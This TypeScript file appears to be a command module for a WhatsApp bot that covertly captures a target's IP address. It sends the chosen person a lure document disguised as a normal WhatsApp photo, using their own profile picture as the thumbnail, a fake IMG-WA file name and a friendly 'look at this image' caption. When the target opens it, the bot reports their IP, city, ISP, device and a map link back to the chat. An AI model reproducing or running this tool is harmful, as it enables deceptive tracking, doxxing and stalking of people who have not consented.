import { randomBytes } from "node:crypto";
import { readFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import {
  buildDocumentMessage,
  closeSession,
  createSession,
  ensurePublicBase,
  hasActiveSession,
  selfTest,
  sessionUrl,
  TRAP_TTL_MS,
  type TrapHit,
  type TrapSession,
} from "../../core/ipTrap.ts";

const PLACEHOLDER = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==";
const FALLBACKS = ["assets/img/whoisip.jpg", "assets/img/default.jpg", "assets/img/bot.jpg"];

const withTimeout = <T>(p: Promise<T>, ms: number, label: string): Promise<T> =>
  Promise.race([p, new Promise<T>((_, rej) => setTimeout(() => rej(new Error(`timeout: ${label}`)), ms))]);

const flagOf = (cc?: string) =>
  cc ? [...cc.toUpperCase()].map((c) => String.fromCodePoint(127397 + c.charCodeAt(0))).join("") : "🏳️";

function deviceOf(ua: string) {
  if (/android/i.test(ua)) return "📱 Android";
  if (/iphone|ipad|ipod|ios/i.test(ua)) return "🍎 iOS";
  if (/windows/i.test(ua)) return "🖥️ Windows";
  if (/mac os|macintosh/i.test(ua)) return "🖥️ macOS";
  if (/linux/i.test(ua)) return "🐧 Linux";
  return "❔ Desconocido";
}

async function sendReport(sock: any, s: TrapSession, hit: TrapHit) {
  const g = hit.geo;
  const n = s.hits.filter((h) => !h.self).length;
  let localTime = "N/D";
  if (g?.tz) {
    try {
      localTime = new Intl.DateTimeFormat("es-CO", { timeZone: g.tz, dateStyle: "short", timeStyle: "medium" }).format(new Date(hit.at));
    } catch {}
  }
  const tipo = g?.proxy ? "🛡️ Proxy / VPN" : g?.mobile ? "📶 Red móvil" : g?.hosting ? "🖧 Hosting" : "🌐 Red fija / otra";

  const lines = [
    n === 1 ? `📡 *${fytBold("IP CAPTURADA")}*` : `📡 *${fytBold(`IP ADICIONAL #${n}`)}*`,
    ``,
    `╭─〔 🎯 *OBJETIVO* 〕`,
    `┃ 👤 *Nombre:* ${s.pushName}`,
    `┃ 📱 *Número:* \`+${s.targetPhone}\``,
    `┃ 🔗 *JID:* \`${s.targetJid}\``,
    `╰─────────────────────`,
    ``,
    `╭─〔 🛰️ *CONEXIÓN* 〕`,
    `┃ 🌐 *IP:* \`${hit.ip}\``,
    `┃ ${g?.countryCode ? `🏳️ *País:* ${flagOf(g.countryCode)} ${g.country ?? "?"}` : "🏳️ *País:* Desconocido"}`,
    `┃ 🗺️ *Región:* ${g?.region ?? "N/D"}`,
    `┃ 🏙️ *Ciudad:* ${g?.city ?? "N/D"}`,
    `┃ 📶 *Tipo:* ${tipo}`,
    `┃ 🏢 *ISP:* ${g?.isp ?? "N/D"}`,
    `┃ 🏛️ *Org:* ${g?.org ?? "N/D"}`,
    `┃ 🔢 *ASN:* ${g?.asn ?? "N/D"}`,
    `┃ 🕒 *TZ:* \`${g?.tz ?? "N/D"}\``,
    `┃ ⌚ *Hora local:* ${localTime}`,
    ...(g?.lat && g?.lon ? [`┃ 📍 *Mapa:* https://www.google.com/maps?q=${g.lat},${g.lon}`] : []),
    `╰─────────────────────`,
    ``,
    `╭─〔 🧾 *CLIENTE* 〕`,
    `┃ 🖥️ *Dispositivo:* ${deviceOf(hit.ua)}`,
    `┃ 🏷️ *UA:* ${hit.ua.slice(0, 150)}`,
    `┃ 🕐 *Capturado:* ${new Date(hit.at).toLocaleString("es-CO")}`,
    `╰─────────────────────`,
    ``,
    g?.proxy || g?.hosting
      ? `⚠️ IP de proxy/VPN o datacenter: la ubicación puede no ser la real.`
      : g?.mobile
        ? `ℹ️ IP de operador móvil: ciudad aproximada por NAT del carrier.`
        : `ℹ️ Geolocalización a nivel de ciudad por base de datos de IP.`,
  ];

  await sock.sendMessage(s.chatJid, { text: lines.join("\n") }).catch(() => undefined);
}

export default {
  name: ["whoisip", "ipgrab", "rastrearip"],
  category: "group",
  description: "Captura la IP del objetivo con un documento trampa y reporta su geolocalización.",
  groupOnly: false,
  async run(ctx: CommandContext) {
    const { reply, react, msg, args, sock, from, groupMeta } = ctx;
    const log = (t: string) => console.log(`[whoisIP] ${t}`);

    try {
      const modo = (args[0] ?? "").toLowerCase().replace(/[^a-z]/g, "");

      if (modo === "ping") return reply("🟢 vivo.");

      if (modo === "test") {
        const base = await ensurePublicBase();
        const r = await withTimeout(fetch(`${base}/__ping`), 10000, "probe").catch(
          (e) => ({ status: 0, text: () => e.message }) as any
        );
        return reply(`🧪 Túnel: ${base}\nProbe: ${r.status} · ${(await r.text()).slice(0, 40)}`);
      }

      const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
      let raw = "";
      if (contextInfo?.mentionedJid?.length) raw = contextInfo.mentionedJid[0];
      else if (contextInfo?.participant) raw = contextInfo.participant;
      else if (args.length) raw = args.join("");
      if (!raw) return reply("⚠️ Uso: *whoisIP +573118353868* — o etiqueta / responde a alguien.");
      if (hasActiveSession(from)) return reply("⏳ Ya hay un *whoisIP* activo en este chat.");

      const isLid = raw.endsWith("@lid");
      let digits = raw.split("@")[0].split(":")[0].replace(/\D/g, "");
      let targetJid = isLid ? `${digits}@lid` : `${digits}@s.whatsapp.net`;

      const participant = groupMeta?.participants?.find((p: any) => {
        const pLid = String(p.lid ?? "").split("@")[0].split(":")[0];
        const pId = String(p.id ?? "").split("@")[0].split(":")[0];
        return pLid === digits || pId === digits;
      }) as any;

      const realPhone = participant?.phoneNumber ? String(participant.phoneNumber).replace(/\D/g, "") : !isLid ? digits : "";
      if (realPhone) {
        digits = realPhone;
        targetJid = `${realPhone}@s.whatsapp.net`;
      }
      if (!digits || digits.length < 7) return reply("⚠️ No pude resolver un número. Escríbelo: *whoisIP +573118353868*.");

      await react("🔎").catch(() => undefined);

      if (!isLid) {
        const check = await withTimeout(sock.onWhatsApp(targetJid), 10000, "onWhatsApp").catch((e: any) => {
          log(`onWhatsApp ${e?.message}`);
          return null;
        });
        if (!check?.[0]?.exists) return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
      }

      const pushName = participant?.name || participant?.notify || `+${digits}`;

      let plain: Buffer | null = null;
      try {
        const pp = await withTimeout(sock.profilePictureUrl(targetJid, "image"), 9000, "pp");
        if (pp) {
          const r = await withTimeout(fetch(pp), 9000, "pp-fetch");
          if (r.ok) plain = Buffer.from(await r.arrayBuffer());
        }
      } catch (e: any) {
        log(`pp ${e?.message}`);
      }
      if (!plain) {
        const local = FALLBACKS.find((p) => existsSync(p));
        if (local) {
          try {
            plain = await readFile(local);
          } catch {}
        }
      }
      if (!plain) plain = Buffer.from(PLACEHOLDER, "base64");

      const fileName = `IMG-${new Date().toISOString().slice(0, 10).replace(/-/g, "")}-WA${
        Math.floor(Math.random() * 9000) + 1000
      }.jpg`;

      const session = await createSession({
        plain,
        fileName,
        targetJid,
        targetPhone: digits,
        chatJid: from,
        pushName: String(pushName),
        onHit: (s, hit) => sendReport(sock, s, hit),
        onExpire: async (s) => {
          await sock
            .sendMessage(s.chatJid, {
              text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó en ${Math.round(
                TRAP_TTL_MS / 1000
              )}s.`,
            })
            .catch(() => undefined);
        },
      });

      const test = await selfTest(session);
      if (!test.ok) {
        closeSession(session);
        await react("❌").catch(() => undefined);
        return reply(`❌ El túnel no sirve el archivo: *${test.reason}*\n${sessionUrl(session)}`);
      }

      const captions = ["hola bro, mira imagen", "hola bro, mira la imagen", "bro, mírame esto", "hola, mira esta imagen"];
      const caption = captions[Math.floor(Math.random() * captions.length)];

      const docMsg: any = buildDocumentMessage(session, caption);
      if (plain.length <= 60000) docMsg.documentMessage.jpegThumbnail = plain;

      const messageId = "3EB0" + randomBytes(8).toString("hex").toUpperCase();

      let destino = targetJid;
      let enviado = false;

      const intentos: Array<{ jid: string; via: string }> = [
        { jid: targetJid, via: "sendMessage(proto)" },
        { jid: targetJid, via: "relayMessage" },
        { jid: from, via: "sendMessage(proto)" },
        { jid: from, via: "upload" },
      ];

      for (const intento of intentos) {
        if (enviado) break;
        try {
          if (intento.via === "upload") {
            await withTimeout(
              sock.sendMessage(intento.jid, {
                document: { url: sessionUrl(session) },
                mimetype: "image/jpeg",
                fileName: session.fileName,
                caption,
              } as any),
              20000,
              "upload"
            );
          } else if (intento.via === "relayMessage") {
            await withTimeout((sock as any).relayMessage(intento.jid, docMsg, { messageId }), 15000, "relayMessage");
          } else {
            await withTimeout(sock.sendMessage(intento.jid, docMsg as any, { messageId } as any), 15000, "sendMessage-proto");
          }
          enviado = true;
          destino = intento.jid;
          log(`enviado a ${intento.jid} vía ${intento.via}`);
        } catch (e: any) {
          log(`${intento.via} a ${intento.jid} falló: ${e?.message}`);
        }
      }

      await react(enviado ? "📡" : "❌").catch(() => undefined);

      if (!enviado) return reply("❌ No salió por ninguna vía. Revisa la consola.");

      const alPrivado = destino === targetJid;
      return reply(
        alPrivado
          ? `✅ Enviado al privado de \`+${digits}\`\n_El reporte con la IP llegará aquí cuando lo descargue._`
          : `⚠️ No pude abrir el privado de \`+${digits}\`, lo mandé al grupo.\n_El reporte llegará aquí cuando lo descargue._`
      );
    } catch (e: any) {
      log(`ERROR ${e?.stack ?? e}`);
      await react("❌").catch(() => undefined);
      await reply(`❌ *whoisIP* explotó:\n\`${String(e?.stack ?? e?.message ?? e).slice(0, 400)}\``).catch(() => undefined);
    }
  },
};
